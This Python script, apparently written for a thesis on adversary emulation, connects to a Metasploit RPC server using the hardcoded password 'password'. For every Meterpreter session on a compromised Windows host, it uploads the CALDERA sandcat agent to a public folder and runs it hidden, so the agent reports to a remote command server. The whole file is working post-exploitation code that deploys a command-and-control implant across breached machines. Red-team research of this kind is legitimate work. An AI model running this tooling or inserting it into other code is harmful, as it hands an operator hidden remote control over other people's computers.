import subprocess, argparse, socket
from pymetasploit3.msfrpc import MsfRpcClient, MsfError
from time import sleep
import os

verbose = False


def start_msf_server():
    """
    Turns on and connects to the Metasploit RPC Server
    :return: MsfRcpClient object from pymetasploit3
    """
    # check if server is already running
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        try:
            s.bind(('0.0.0.0', 55553))
            s.close()

            # start msfrpcd server
            if verbose:
                print("Starting server")
            command = "/root/start_msfrpcd.sh"
            p = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            sleep(10)
        finally:
            if verbose:
                print("Connecting to rpc server")
            return MsfRpcClient('password')


def start_sandcat(msfclient, caldera_server):
    """
    Will start sandcat on all remote hosts that have running metasploit sessions
    :param msfclient: msfrpc client to use for gathering sessions
    :param caldera_server: the address of the caldera server for sandcat to report to
    :return:
    """

    for session in msfclient.sessions.list:
        # start sandcat on windows
        if 'meterpreter' in msfclient.sessions.list[session]['desc'].lower():
            try:
                # file server is on port 8000 not 8888
                file_server = caldera_server[:-3] + "000/sandcat.go-windows"

                msfclient.sessions.session(session).runsingle("ps")
                proc = msfclient.sessions.session(session).read()

                if 'sandcat' in proc.lower():
                    print("Sandcat already running")
                    # sandcat is already running
                    continue
                else:
                    # upload sandcat
                    msfclient.sessions.session(session).runsingle(f"upload /root/jboozCaldera/caldera-thesis/plugins/sandcat/payloads/sandcat.go-windows C:\\\\Users\\\\Public\\\\sandcat.exe")
                    sleep(5)
                    # start sandcat
                    msfclient.sessions.session(session).runsingle(f"execute -H -f C:\\\\Users\\\\Public\\\\sandcat.exe -a '-server {caldera_server} -group my_group'")

            except MsfError as e:
                print(e)
                continue
            except KeyError as e:
                print(f"key error probably on dead session for host {msfclient.sessions.list[session]['target_host']}")
                continue


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--server", required=True)
    parser.add_argument("--verbose", required=False, default=False, action="store_true")
    args = parser.parse_args()
    global verbose
    verbose = args.verbose

    # server is provided -- Connect to it
    if args.server:
        ip = args.server[7:-5]  # strip off http:// from beginning & :8888 at the end
        client = MsfRpcClient(server=ip, password='password')

    # start a server locally
    else:
        client = start_msf_server()

    start_sandcat(client, args.server)


if __name__ == "__main__":
    main()